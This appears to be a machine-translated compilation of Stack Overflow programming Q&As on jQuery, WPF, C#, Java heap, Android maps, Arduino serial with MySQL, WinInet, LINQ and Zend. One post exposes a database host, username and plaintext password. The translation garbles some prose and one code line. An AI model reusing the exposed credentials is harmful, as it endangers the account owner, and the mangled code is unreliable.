# jquery - simpledialog2，样式自定义

> ID：11583776
> 
> 赞同：1
> 
> 时间：2012-07-20T16:54:34.970
> 
> 标签：jquery, jquery-mobile

我有一个应用程序，它有几种类型的弹出窗口，所以每个都应该有自己的 CSS 样式，有没有办法做到这一点，给 simpledialog2 一个自定义 CSS 样式，但不是应用程序中的所有对话框？我尝试过： `$("<div>").simpledialog2({ .... }).attr('class', 'someClass');` 我也尝试过：

```
$("#myElement").simpledialog2({....,buttons : {   'Aceptar': {     click: function () { 
},     icon: ""    }   }}); 
```

但它不起作用。

我需要在弹出窗口中有按钮，所以我最好不要使用“blankContent”，因为它不会让仅在按下按钮时关闭弹出窗口。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T00:11:36.213

我可以在 simpledialog2 的定义中使用“主题”值，如 `theme: "d"`，然后我可以更改它的 CSS 样式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T16:42:17.070

要关闭弹出窗口，您只需要在文档[http://dev.jtsage.com/jQM-SimpleDialog/demos2/blankin.html中提供一个带有 rel='close' 的链接](http://dev.jtsage.com/jQM-SimpleDialog/demos2/blankin.html)

```
<!--NOTE: blankContent is set to TRUE, and the content goes IN the div. -->
<div id="inlinecontent" style="display:none" 
  data-options='{"mode":"blank","headerText":"Yo","headerClose":true,"blankContent":true}'>

    <ul data-role='listview'><li>Some</li><li>List</li><li>Items</li></ul>
    <a rel='close' data-role='button' href='#'>Close</a>
</div> 
```

# wpf - 奇怪的渲染性能

> ID：11583782
> 
> 赞同：1
> 
> 时间：2012-07-20T16:55:06.687
> 
> 标签：wpf, performance, rendering

我想在 WPF 中进行一些渲染，以便在 MSDN 中找到建议使用轻量级 DrawingVisual 来制作渲染对象（例如三角形）的提示

每当渲染的属性（例如颜色、坐标）发生变化时，它都会再次渲染。（例如 RenderOpen()；drawingContext.Draw(.......) ........）

然后，我将基类的渲染对象替换为 UIElement 而不是 DrawingVisual，其他相同。而且我发现无论我如何更改属性，我都只会渲染一次。尽管如此，每当属性更改时，我都会调用 InvalidateVisual()。

最终，我发现渲染性能比 DrawingVisual 好很多。

这是事实吗？

# c# - Windows Store 应用中的 TaskDelay

> ID：11583783
> 
> 赞同：0
> 
> 时间：2012-07-20T16:55:14.757
> 
> 标签：c#, windows-store-apps

```
string word = "sos";
    Dictionary<string, string> Codes = new Dictionary<string, string>
        {
            {"a", ".-   "}, {"b", "-... "}, {"c", "-.-. "}, {"d", "-..  "}, 
            {"e", ".    "}, {"f", "..-. "}, {"g", "--.  "}, {"h", ".... "},
            {"i", "..   "}, {"j", ".--- "}, {"k", "-.-  "}, {"l", ".-.. "},
            {"m", "--   "}, {"n", "-.   "}, {"o", "---  "}, {"p", ".--. "}, 
            {"q", "--.- "}, {"r", ".-.  "}, {"s", "...  "}, {"t", "-    "}, 
            {"u", "..-  "}, {"v", "...- "}, {"w", ".--  "}, {"x", "-..- "}, 
            {"y", "-.-- "}, {"z", "--.. "}, {"0", "-----"}, {"1", ".----"}, 
            {"2", "..---"}, {"3", "...--"}, {"4", "....-"}, {"5", "....."}, 
            {"6", ".----"}, {"7", "..---"}, {"8", "...--"}, {"9", "....-"}    
        };

    async public void RunMorseCode()
    {

        foreach (char c in word.ToCharArray())
        {
            string rslt = Codes[c.ToString()].Trim();
            foreach (char c2 in rslt.ToCharArray())
            {
                if (c2 == '.')
                {

                    gridHalfFront.Opacity = 0;
                     await Task.Delay(100);

                }
                else if(c2 == '-')
                {

                    gridHalfFront.Opacity = 0;
                     await Task.Delay(1000);

                }
                gridHalfFront.Opacity = 1;

            }

        }
    } 
```

之后变黑并停止工作，Windows Store App，知道吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-09-03T12:17:40.523

这个问题是合乎逻辑的。解决方案：

```
gridHalfFront.Opacity = 1;
await Task.Delay(1000); 
```

您还可以使用 Blend 并使用动画和故事板等创建状态

*   [动画概述](https://msdn.microsoft.com/en-us/library/cc295346.aspx)
*   [XAML 设计器中的动画对象（视频）](https://msdn.microsoft.com/en-us/library/jj171046.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-13T08:18:12.347

我刚刚在适用于 Windows 8.1 和 Windows 10 的 Windows 应用商店应用程序中的 Visual Studio 2015RC 中检查了这一点。它在这两种情况下都有效，但你最好在代码中添加另一个 Task.Delay，否则闪烁效果将不可见 - 也许这是你认为什么是“变黑”？我建议你在最后添加另一行

*gridHalfFront.Opacity = 1;*

例如在这里添加

*等待任务.延迟（100）；*

这使闪烁更明显，应用程序感觉更“响应”。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-20T18:16:31.707

尝试用`Task.Delay()`这个替换你的电话：

```
new System.Threading.ManualResetEvent(false).WaitOne(milliseconds); 
```

显然，对于您`Task.Delay()`正在[尝试做的事情来说，这并不是最棒的事情](http://social.msdn.microsoft.com/Forums/sk/winappswithcsharp/thread/295e8ff1-812f-44de-8a72-ae3480d1060f)。

# java - 堆：幸存者空间

> ID：11583786
> 
> 赞同：1
> 
> 时间：2012-07-20T16:55:19.487
> 
> 标签：java, memory, heap-memory

我编写了一个示例 java 应用程序，它分配内存然后永远运行。
为什么幸存者空间使用的内存是0kbytes？！

```
 List<String> stringlist = new ArrayList<String>();

    while (true) {
        stringlist.add("test");
        if (stringlist.size() >= 5000000)
            break;
    }

    while (true)
        for (String s : stringlist); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-20T17:07:49.513

因为“test”是一个字符串文字，它最终会在永久内存而不是堆中。您创建的对象的内存大小为 5000000 + 4*2 ~ 5MB，可以轻松放入 Eden 空间。

调整

```
stringlist.add("test"); 
```

到

```
stringlist.add(new String("test")); 
```

你会得到 5000000 * 4 * 2 =38MB，它很可能仍然适合 Eden。您可以增加列表大小或字符串长度以确保您有幸存者。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-08-11T13:23:25.123

`"test"`是一个`String`字面量，不管它是如何存储的（这在 Java 开发过程中发生了变化），这里的重点是，*它是一个单一的对象*。

[回忆一下 Java 语言规范](http://docs.oracle.com/javase/specs/jls/se7/html/jls-3.html#jls-3.10.5)：

> …字符串字面量总是指向*同*一个 class 实例`String`。这是因为字符串文字 - 或者更一般地说，作为常量表达式值的字符串（第 15.28 节） - 是“内部的”，以便使用 String.intern 方法共享唯一实例

`String`因此，在您的循环中没有创建 new ，因为它`"test"`总是引用同一个`String`实例。唯一的堆变化发生在`ArrayList`的内部容量耗尽时。

* * *

的内部数组最终所需的内存`ArrayList`取决于对象引用的大小，通常`5000000*4 bytes`用于具有压缩 oops 的 32 位 JVM 和 64 位 JVM 以及`5000000*8 bytes`没有压缩 oops 的 64 位 JVM。

这里有趣的一点在[www.kdgregory.com](http://www.kdgregory.com/index.php?page=java.outOfMemory#miscFailures)上有描述：

> 如果你的对象足够大，它会直接在tenured generation中创建。用户定义的对象不会（不应该！）有任何接近触发此行为所需的成员数量，但数组将：使用 JDK 1.5，大于 0.5 兆字节的数组直接进入终身代。

[这与oracle.com 上的这些词](http://www.oracle.com/technetwork/java/javase/gc-tuning-6-140523.html#generation_sizing.young_gen.survivors)一致：

> 如果幸存者空间太小，复制集合会直接溢出到终身代。

这给出了更大的数组可能不会出现在幸存者空间中的另一个原因。因此，它们是否因为从 Eden 空间复制到 Tenured Generation 或最初在 Tenured Generation 中创建而没有出现取决于确切的配置。但是没有出现在幸存者空间的结果是一样的。

* * *

因此，当`ArrayList`使用其[默认容量`10`](http://docs.oracle.com/javase/7/docs/api/java/util/ArrayList.html#ArrayList())创建 时，内部数组小于此阈值，每次容量扩大时要创建的下一个数组也是如此。但是，当新数组超过这个阈值时，所有旧数组都是垃圾，因此不会显示为“幸存者”。

因此，在第一个循环结束时，您只有一个剩余数组，其大小远远超过阈值，因此绕过了幸存者空间。您的第二个循环不会向内存管理添加任何内容。它会创建临时`Iterator`的 s，但这些永远不会“生存”。

# android - Mapview api关键问题

> ID：11583789
> 
> 赞同：1
> 
> 时间：2012-07-20T16:55:33.133
> 
> 标签：android, google-maps, android-mapview, api-key

> **可能重复：**
> [无法获取连接工厂客户端 - 与谷歌地图打架](https://stackoverflow.com/questions/7982320/couldnt-get-connection-factory-client-fighting-with-google-maps)

我的地图视图有问题。我为我的应用程序创建了一个新的密钥库，并获得了正确的 google maps api 密钥，并且我的应用程序使用我的密钥库进行了签名。但是地图视图不起作用。我正在阅读很多关于它的帖子，但我无法解决它

我有一些错误：

```
07-20 18:16:49.066: I/MapActivity(9106): Handling network change notification:CONNECTED
07-20 18:16:49.066: E/MapActivity(9106): Couldn't get connection factory client
07-20 18:16:49.276: W/System.err(9106): IOException processing: 26
07-20 18:16:49.286: W/System.err(9106): java.io.IOException: Server returned: 3
07-20 18:16:49.296: W/System.err(9106):     at android_maps_conflict_avoidance.com.google.googlenav.map.BaseTileRequest.readResponseData(BaseTileRequest.java:115)
07-20 18:16:49.296: W/System.err(9106):     at android_maps_conflict_avoidance.com.google.googlenav.map.MapService$MapTileRequest.readResponseData(MapService.java:1473)
07-20 18:16:49.296: W/System.err(9106):     at android_maps_conflict_avoidance.com.google.googlenav.datarequest.DataRequestDispatcher.processDataRequest(DataRequestDispatcher.java:1117)
07-20 18:16:49.296: W/System.err(9106):     at android_maps_conflict_avoidance.com.google.googlenav.datarequest.DataRequestDispatcher.serviceRequests(DataRequestDispatcher.java:994)
07-20 18:16:49.296: W/System.err(9106):     at android_maps_conflict_avoidance.com.google.googlenav.datarequest.DataRequestDispatcher$DispatcherServer.run(DataRequestDispatcher.java:1702)
07-20 18:16:49.296: W/System.err(9106):     at java.lang.Thread.run(Thread.java:856) 
```

其他时间出现相同的错误，但没有出现以下行：

> 无法获取连接工厂客户端 07-20 18:16:49.276:

我的 mapview.xml：

```
<com.google.android.maps.MapView
    android:id="@+id/mapa"
    style="@style/mapView"
    android:layout_width="fill_parent"
    android:layout_height="200dip"
    android:apiKey="@string/apikey"
    android:clickable="true" >
</com.google.android.maps.MapView> 
```

显化

```
..............................
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CALL_PHONE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <application
        android:icon="@drawable/icon"
        android:label="@string/app_name" 
       >
        <uses-library android:name="com.google.android.maps" />
.............................. 
```

我正在疯狂寻找解决方案，将不胜感激！

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:45:19.517

尝试将您的地图密钥直接放到

```
android:apiKey="" 
```

你必须在模拟器上添加你的谷歌帐户

```
Setting --> Account&sync --> add account --> google 
```

你的模拟器必须支持 google api

享受

# c# - 通过 C♯ SQL 到 Arduino

> ID：11583797
> 
> 赞同：0
> 
> 时间：2012-07-20T16:56:04.050
> 
> 标签：c#, mysql, arduino

作为我正在整理的项目的一部分，我有一个 Arduino 通过 C♯ 更新 MySQL 数据库，并且在另一个位置我有另一个 C♯ 程序对数据库执行简单的 SELECT 查询，并通过将其发现传达给另一个 Arduino串行。我已经为第二个程序编写了大部分代码，但最后遇到了一些烦人的问题。

下面是代码：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MySql.Data.MySqlClient;
using System.Xml;
using System.IO.Ports;

namespace ConsoleApplication3
{
    class Program
    {
        static void Main(string[] args)
        {
            string hkday;
            string hkall;
            //SERIAL
            SerialPort serialPort1 = new SerialPort();
            serialPort1.PortName = "COM4";
            serialPort1.BaudRate = 9600;
            serialPort1.NewLine = "\n";

            //OPEN SERIAL
            serialPort1.Open();

            //SQL
            string connString = "Server=xxxx;Uid=xxxx;Password=xxxx;Port=xxxx;Database=xxxx;";
            MySqlConnection conn = new MySqlConnection(connString);
            MySqlCommand command1 = conn.CreateCommand();
            command1.CommandText = "Select USERS from HK where UPTIME='HKDAY'";
            MySqlCommand command2 = conn.CreateCommand();
            command2.CommandText = "Select USERS from HK where UPTIME='HKALL'";

            //EXECUTE QUERIES
            if (_continue = true)
            {
                conn.Open(); //Connect
                MySqlDataReader reader1 = command1.ExecuteReader();
                while (reader1.Read())
                {
                    //Write to value and string   
                    Console.WriteLine(reader1["USERS"].ToString());
                    hkday = reader1["USERS"].ToString();
                }

                Console.ReadLine();
                _continue = false;
                conn.Close(); //Disconnect
            }
            else
            {
                conn.Open(); //Connect
                MySqlDataReader reader2 = command1.ExecuteReader();
                while (reader2.Read())
                {
                    //Write to console and string    
                    Console.WriteLine(reader2["USERS"].ToString());
                }
                hkall = reader2["USERS"].ToString();

                Console.ReadLine();
                _continue = true;
                conn.Close(); //Disconnect

                //WRITE STRINGS TO SERIAL
                serialPort1.WriteLine(
                    String.Format(hkday, hkall));
            }

            serialPort1.Close();

        }

        public static bool _continue { get; set; }
    }
} 
```

1.  我无法弄清楚我的标题为 WRITE STRINGS TO SERIAL 的部分需要如何编写语法并将其放置在代码中才能引用“hkday”和“hkall”

2.  我的 'if (_continue = true)' 标志似乎不起作用，我不知道为什么。

3.  我认为如果解决了这两个问题，程序应该可以工作，你还能看到其他明显的问题吗？

谢谢，我知道这些只是小问题，但我似乎无法解决它们。

潜在重要：我正在尝试将输出设为 '123,456\n'，因为我的 arduino 程序已经将其识别为它的输入。

* * *

## 更新

收到我的答案后，我将这个项目与我目前正在做的另一个项目结合起来，尝试让 arduino 通过 C# 更新 MySQL 数据库，然后让它下载它没有更新的表数据以显示通过另一个arduino。

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO.Ports;
using MySql.Data.MySqlClient;

namespace SQL_Scraper
{

    public partial class Sandro : Form
    {
        //Serial Settings
        SerialPort UNO = new SerialPort("COM4", 9600);
        SerialPort MEGA = new SerialPort("COM3", 9600);

        //Incoming Data String
        string RxString;

        //Int for download
        int? vnday = 0;
        int? vnall = 0;

        public Sandro()
        {
            InitializeComponent();

            //Open UNO port
            UNO.Open();

            //Open MEGA Port
            MEGA.Open();
        }

        private void MEGA_DataReceived(object sender, System.IO.Ports.SerialDataReceivedEventArgs e)
        {

        }

        private void Sandro_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (UNO.IsOpen | MEGA.IsOpen)
            {
                UNO.Close();
                MEGA.Close();
            }
        }

        private void DisplayText(object sender, EventArgs e)
        {

        }

        private void Begin_Click(object sender, EventArgs e)
        {
            //Turn off start button
            Begin.Enabled = false;
            //?
            this.Invoke(new EventHandler(DisplayText));
            //Create Event Handler if data is receiverd
            MEGA.DataReceived += new SerialDataReceivedEventHandler(MEGA_DataReceived);

            string SQLString = "Server=benchmarkcount.db.9506323.hostedresource.com;Uid=benchmarkcount;Password=Watercress2428;Port=3306;Database=benchmarkcount;";
            MySqlConnection SQLConnection = new MySqlConnection(SQLString);

            //Receive data
            RxString = MEGA.ReadExisting();

            //Append Serial Input to Output box)
            outputBox.AppendText(RxString);

            //Get Unsaved input from text box
            string input = outputBox.Text;
            string[] inputLines = input.Split('\n');

            //Upload findings from MEGA to SQL
            foreach (string line in inputLines)
            {
                if (line.EndsWith("\r")) //Makes sure line is complete
                {
                    if (line.StartsWith("Today's total users: "))
                    {
                        string dayUsers = line.Substring(20).Trim();
                        MySqlCommand UpdateHKDAY = SQLConnection.CreateCommand();
                        UpdateHKDAY.Parameters.AddWithValue("param1", dayUsers);
                        UpdateHKDAY.CommandText = "UPDATE HK SET USERS=?param1 WHERE UPTIME='HKDAY'";
                        SQLConnection.Open();
                        UpdateHKDAY.ExecuteNonQuery();
                        SQLConnection.Close();
                    }
                    else if (line.StartsWith("All-time total users: "))
                    {
                        string allUsers = line.Substring(21).Trim();
                        MySqlCommand UpdateHKALL = SQLConnection.CreateCommand();
                        UpdateHKALL.Parameters.AddWithValue("param2", allUsers);
                        UpdateHKALL.CommandText = "UPDATE HK SET USERS=?param2 WHERE UPTIME='HKALL'";
                        SQLConnection.Open();
                        UpdateHKALL.ExecuteNonQuery();
                        SQLConnection.Close();
                    }
                }
            }

            //Only keep unparsed text in text box
            outputBox.Text = inputLines[inputLines.Length - 1];

            //Download Numbers Query
            MySqlCommand DownUsers = new MySqlCommand("Select USERS, UPTIME from VN where UPTIME IN ('VNDAY', 'VNALL')", SQLConnection);

            //Open Connection
            SQLConnection.Open();

            //Execute Downloading Numbers
            MySqlDataReader theResults = DownUsers.ExecuteReader();
            while (theResults.Read())
            {
                switch (theResults["UPTIME"] as string)
                {
                    case "VNDAY":
                        vnday = theResults["USERS"] as int?;
                        break;
                    case "VNALL":
                        vnall = theResults["USERS"] as int?;
                        break;
                }
            }

            //Do things with the results
            UNO.WriteLine(String.Format("{0},{1}", vnday, vnall));
            Console.WriteLine(String.Format("{0},{1}", vnday, vnall));

            //Close Connection
            SQLConnection.Close();
        }

        private void Sandro_Load(object sender, EventArgs e)
        {

        }

        private void Cease_Click(object sender, EventArgs e)
        {
            Begin.Enabled = true;
            Cease.Enabled = false;
        }
    }
} 
```

但是，我希望能够在我的 inputBox 中检查这些数据——发送到 arduino 的数据，以确保它的格式为“vnday，vnall\n”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T20:33:26.133

你的问题和例子有太多的矛盾。您似乎认为单独的应用程序运行之间存在静态持久性。没有。每次运行都会清除所有静态变量。如果您有一个在同一个应用程序域内循环调用的方法，情况会有所不同。

此外，根据您的变量名称和输出要求，USERS 字段是一个数字。

因此，假设您有下表：

```
USERS    UPTIME
------   ------
123456   HKALL
234567   HKDAY 
```

以下代码：

```
public static void Main()
{
    int? hkday = 0;
    int? hkall = 0;

    using (MySqlConnection conn = new MySqlConnection("..."))
    {
        conn.Open();

        MySqlCommand cmd = new MySqlCommand("Select USERS, UPTIME from HK where UPTIME IN ('HKDAY', 'HKALL')", conn);

        MySqlDataReader reader = cmd.ExecuteReader();

        //this assumes that there is only one record per 'HKDAY' and 'HKALL',
        //otherwise the last value will be stored
        while (reader.Read())
        {
            switch (reader["UPTIME"] as string)
            {
                case "HKDAY":
                    hkday = reader["USERS"] as int?;
                    break;
                case "HKALL":
                    hkall = reader["USERS"] as int?;
                    break;
            }
        }
    }

    Console.WriteLine(String.Format("{0:N0}\n{1:N0}\n", hkday, hkall));
} 
```

将输出：

```
234,567
123,456 
```

或者，如果您希望运行独立查询：

```
private static int? GetUSERS(string hkval)
{
    using (MySqlConnection conn = new MySqlConnection("..."))
    {
        conn.Open();

        MySqlCommand cmd = new MySqlCommand("Select USERS from HK where UPTIME=@hkval", conn);
        cmd.Parameters.AddWithValue("hkval", hkval);

        MySqlDataReader reader = cmd.ExecuteReader();

        if (reader.Read())
            return reader["USERS"] as int?;

        return null;
    }
}

public static void Main()
{
    int hkday = (int)GetUSERS("HKDAY");
    int hkall = (int)GetUSERS("HKALL");

    Console.WriteLine(String.Format("{0:N0}\n{1:N0}\n", hkday, hkall));
} 
```

您还可以使用 args 将 HKDAY/HKALL 作为参数传递给您的应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:32:50.063

我不是 C 程序员，但知道很多串口，我想这解决了你的第一个问题。

```
//WRITE STRINGS TO SERIAL
      serialPort1.Write(hkday);             // do not append line feed
      serialPort1.WriteLine(hkall);         // append line feed 
```

# delphi - 为 InternetReadFile 设置超时 (WinInet + Delphi)

> ID：11583798
> 
> 赞同：1
> 
> 时间：2012-07-20T16:56:06.650
> 
> 标签：delphi, delphi-xe, wininet

我的应用程序需要通过检索其文本内容来处理 url 列表。我的互联网连接是由

```
myTimeOut:= 2000;
InternetSetOption(nil, INTERNET_OPTION_CONNECT_TIMEOUT, Pointer(@myTimeOut), SizeOf(myTimeOut));
InternetSetOption(nil, INTERNET_OPTION_SEND_TIMEOUT, Pointer(@myTimeOut), SizeOf(myTimeOut));
InternetSetOption(nil, INTERNET_OPTION_RECEIVE_TIMEOUT, Pointer(@myTimeOut), SizeOf(myTimeOut)); 
```

我为每个 url 阅读启动单独的线程

```
(...)
read_url_threads[thread_counter]:= TReadURLThread.Create(false);
read_url_threads[thread_counter].FreeOnTerminate:= False;
read_url_threads[thread_counter].myURL:= target_url_list[i];
read_url_threads[thread_counter].output_filename:= local_output_filename;
read_url_threads[thread_counter].NetHandle:= NetHandle;
read_url_threads[thread_counter].limit_text_size:= max_length_url;
hArr[thread_counter]:= read_url_threads[thread_counter].Handle;
(...)
if (thread_counter >= max_threads) or
   (thread_counter >= (target_url_list.Count)) then

   repeat
     rWait:= WaitForMultipleObjects(thread_counter, @hArr,True, 100);
     Application.ProcessMessages;
   until rWait <> WAIT_TIMEOUT;
(...) 
```

在线程执行中，我通过以下方式检索 url 内容：

```
 if Assigned(NetHandle) and (not EndsText('.pdf',url)) then
    try
      UrlHandle := InternetOpenUrl(NetHandle, PChar(url), nil, 0, 0, 0);
      if Assigned(UrlHandle) then
        try
          repeat
            InternetReadFile(UrlHandle, @Buffer, SizeOf(Buffer), BytesRead);
            SetString(StrBuffer, PAnsiChar(@Buffer[0]), BytesRead);
            Result := Result + StrBuffer;
          until BytesRead = 0;
        finally
          InternetCloseHandle(UrlHandle);
        end; 
```

我的问题是为 InternetReadFile 例程设置超时。有些网址有时会卡住整整几分钟。在此周期中强制超时的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T20:41:05.177

如果配置的超时没有效果（这是一个已知的错误），那么您应该关闭连接句柄，这将强制关联的函数失败，从而将控制权返回给您的程序。Microsoft 文章[Q224318](http://support.microsoft.com/default.aspx?scid=kb;en-us;Q224318)，“如何通过创建第二个线程来控制连接超时值”描述了如何做到这一点。（您需要一个单独的线程，因为另一个线程被卡住等待`InternetReadFile`返回。）

# linq-to-sql - 具有多个连接、分组和计数的 LINQ to SQL

> ID：11583799
> 
> 赞同：7
> 
> 时间：2012-07-20T16:56:14.973
> 
> 标签：linq-to-sql

我有 3 个表，Cust、Order 和 Item，其中包含以下相关字段：

```
Cust - CustID, CustName
Order - OrderID, CustID
Item - ItemID, OrderID 
```

我想找到每个客户的订单和商品总数。

这是一个 SQL 语句，它生成我想要的内容，一个客户列表，其中包含每个客户的订单总数和订购的商品总数。

```
SELECT
  Cust.CustID, Cust.CustName,
  count(DISTINCT Order.OrderID) AS numOrders,
  count(DISTINCT Item.ItemID ) AS numItems
FROM Cust
LEFT JOIN Order ON Order.CustID = Cust.CustID
LEFT JOIN Item ON Item.OrderID = Order.OrderID
GROUP BY Cust.CustID, Cust.CustName
ORDER BY numItems 
```

我将其转换为 LINQ 的第一次尝试是仅计算项目并得出以下结论：

```
var qry = from Cust in tblCust
    join Order in tblOrder on Cust.CustID equals Order.CustID
    join Item in tblItem on Order.OrderID equals Item.OrderID
    group Cust by new {CustID = Cust.CustID, CustName = Cust.CustName} into grp
    orderby grp.Count()
    select new
    {
        ID = grp.Key.CustID,
        Name = grp.Key.CustName,
        Cnt = grp.Count()
    }; 
```

使用此代码，我得到了异常：

```
Value cannot be null. Parameter name: inner 
```

我在正确的轨道上吗？我该怎么做才能得到这两个计数？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-20T17:03:44.523

1.  对于左连接 - 我建议使用 a`from`和`where`a`DefaultIfEmpty`

2.  您需要使用匿名类型进行分组才能对多个参数进行分组

> 值不能为空。参数名称：内

任何连接属性都可以为空吗？

```
 var qry = 
        from Cust in tblCust
        from Order in tblOrder.Where(x => Cust.CustID == x.CustID)
                              .DefaultIfEmpty()
        from Item in tblItem.Where(x => Order.OrderID == x.OrderID)
                            .DefaultIfEmpty()
        group new { Cust, Order.OrderId, Item.ItemId } by new { Cust.CustID, Cust.CustName } into grp
        let numItems = grp.Select(x => x.ItemId).Distinct().Count()
        orderby numItems 
        select new
        {
            ID = grp.Key.CustID,
            Name = grp.Key.CustName,
            numOrders = grp.Select(x => x.OrderId).Distinct().Count(),
            numItems,
        }; 
```

# debugging - Zend 邮件调试

> ID：11583802
> 
> 赞同：1
> 
> 时间：2012-07-20T16:56:38.537
> 
> 标签：debugging, zend-framework, email

我试图找到一种等效的方法来调试 Zend 中的电子邮件，就像在 cakePHP 中一样。我想在发送电子邮件进行测试之前查看我的测试输出。我可以将电子邮件发送给自己，然后以这种方式解决错误，但我觉得这很乏味。

```
//zend mail
$mail = new Zend_Mail();
$mail->setBodyHTML($content);
$mail->setBodyText($content);
$mail->setFrom('noreply@joe.com', 'Security Notification');
$mail->addTo('joeschmo@joe.com');
$mail->setSubject('(Security Notify) New Security Request');
//$mail->send();

//Equivalent to this from cakePHP
$this->Email->delivery = 'debug'; 
$this->Email->send('test message'); 
debug($this->Session->read('Message.email'));
die(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T18:17:55.477

就像是：

```
die($mail->getBodyHtml()); 
```

或者

```
die(print_r($mail)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T18:38:59.197

对于 HTML 中的内容，您可以简单地编写：

```
echo $content; exit(); 
```

对于您的纯文本内容，请写：

```
echo '<pre>' . $content . '</pre>'; exit(); 
```

# css - 具有设置纵横比的响应式幻灯片

> ID：11583804
> 
> 赞同：1
> 
> 时间：2012-07-20T16:56:57.617
> 
> 标签：css, height, response, slideshow, aspect-ratio

我正在尝试使用 Jquery 创建一个简单的幻灯片，但我弄乱了容器的高度属性。我需要高度为“自动”，因为我想在调整大小时保持纵横比稳定。这是我的代码示例，谢谢！

```
<!DOCTYPE html>
<html lang="en-US" dir="ltr"
    <head>
        <meta charset="UTF-8">
        <title>test</title>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js?ver=3.4.1"></script>
        <script type="text/javascript">
            var jq = jQuery.noConflict();
            var i = 0;
            var slides = ["#slide_2", "#slide_1"];
            var imgSrc = new Array(2);
            imgSrc[0] = "banner1.png"
            imgSrc[1] = "banner2.png"
            jq(document).ready(slideShow);

            function slideShow(){
                slides.reverse();
                jq(slides[0]).attr("src", imgSrc[i]);
                jq(slides[0]).fadeIn(1000);
                jq(slides[1]).fadeOut(1000);
                setTimeout("slideShow()", 5000);
                i = (++i >= imgSrc.length)? 0: i;
            }
        </script>
        <style type="text/css">
            .slide {
                position:absolute;
            }
        </style>
    </head>
    <body style="background:#a9a9a9;">
        <headder id="branding" role="banner" style="display:block; background:#d0d0d0; width:100%; height:auto;">
            <h1>Example</h1>
            <div id="slideshow">
                <img id="slide_1" class="slide" src="banner1.png"/>
                <img id="slide_2" class="slide"/>
            </div> <!-- #slideshow -->
        </headder>
        <div id="main">
            <p>Lorem ipsum eu usu assum liberavisse, ut munere praesent complectitur mea. Sit an option maiorum principes. Ne per probo magna idque, est veniam exerci appareat no. Sit at amet propriae intellegebat, natum iusto forensibus duo ut. Pro hinc aperiri fabulas ut, probo tractatos euripidis an vis, ignota oblique ut nec. Ad ius munere soluta deterruisset, quot veri id vim, te vel bonorum ornatus persequeris. Pro hinc aperiri fabulas ut, probo tractatos euripidis an vis, ignota oblique ut nec. Ad ius munere soluta deterruisset, quot veri id vim, te vel bonorum ornatus persequeris.</p>
        </div> <!-- #main -->
        <footer id="last" role="contentinfo" style="background:#3c3c3c;">
            <p style="color:#f9f8f0;">test site</p>
        </footer>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T10:27:29.510

感谢您的回复！在我的情况下，最终起作用的是将我的所有图像包装在另一个空的 jpg（700 字节）图像上，其分辨率与我的幻灯片和 position:relative 相同。它比 javascript 更快更轻，随窗口缩放并且完全尊重文件的“流”。

注意：要创建具有自定义尺寸的空 jpg，您可以在标题中找到 0xFFC0 标记。它之后的第 3 和第 4 个字节是 y 维度，第 5 和第 6 个字节是 x。

干杯；）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T18:20:25.993

在这里，您可以使用 div 或任何标签包装所有图像，并为该 div 应用一些固定高度。这样就不会影响图像的纵横比

# jakarta-ee - 会话过期后 Servlet 自动导航

> ID：11583811
> 
> 赞同：0
> 
> 时间：2012-07-20T16:57:19.550
> 
> 标签：jakarta-ee, servlets, httpsession

大家好，当我搜索如何在会话过期时捕获事件时，我发现 HTTPSessionListener 可用于此目的。但是在使用该类时，我遇到了另一个问题。实际上，我希望当某人的会话过期时（因为我已经修复了）每个用户会话应该在 10 分钟后过期）然后它会自动导航到我的主页。即使没有点击客户端（浏览器），因为我没有在 HTTPSession 类中找到请求和响应对象，所以我无法重定向。
谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T08:49:06.790

**您可以在 HTTPSessionListener 实现中捕获会话创建/终止是正确的，但这与如何在会话终止后重定向用户**无关。

如果我猜对了，您想在 10 分钟不活动后将用户重定向到主页。这可以通过 javascript 而**不是**您的应用程序/Web 服务器来完成。这是因为请求是使用无状态**http**协议完成的 (http://stackoverflow.com/questions/4913763/what-does-it-mean-when-they-say-http-is-stateless)

要使用 javascript 执行此操作：

```
var delay = xxxxx; //The delay is in milliseconds
setTimeout(function(){ window.location = URL; }, delay); 
```

# android - 在不编辑 xml 的情况下设置按钮背景图像更改 onClick，导致按钮背景在某些情况下总是被点击的问题

> ID：11583813
> 
> 赞同：1
> 
> 时间：2012-07-20T16:57:26.110
> 
> 标签：android, android-button

我试图在侦听器中使用此代码更改按钮的 onClick 图像

```
public void onClick(View v) {
   if(v==ButtonName)
   ButtonName.setImageResource(R.drawable.clicked_button_image);
   //action code                              

} 
```

